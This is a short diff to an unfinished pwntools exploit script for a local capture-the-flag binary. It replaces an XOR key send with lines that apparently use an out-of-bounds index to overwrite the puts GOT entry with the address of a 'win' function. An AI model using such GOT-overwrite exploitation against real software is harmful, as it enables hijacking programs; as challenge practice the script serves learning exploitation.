@@ -1,6 +1,7 @@
 from pwn import *
 binary = context.binary = ELF('./chall_08')
 p = process(binary.path)
-p.send(xor(binary.string(binary.sym.key),b'\x30'))
+p.sendline(str((binary.got.puts - binary.sym.target) // 8))
+p.sendline(str(binary.sym.win))
 p.interactive()
 #NOT FINISHED
